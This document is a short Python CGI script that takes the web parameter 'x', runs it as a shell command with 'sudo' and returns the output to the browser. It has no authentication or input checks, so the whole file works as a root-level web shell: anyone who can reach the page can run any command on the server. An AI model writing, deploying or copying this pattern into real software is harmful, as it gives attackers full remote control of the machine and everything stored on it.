#!/usr/bin/python3
import subprocess
import cgi

print("content-type: text/html")
print()

f = cgi.FieldStorage()
cmd = f.getvalue("x")

o = subprocess.getoutput("sudo " + cmd)
print(o)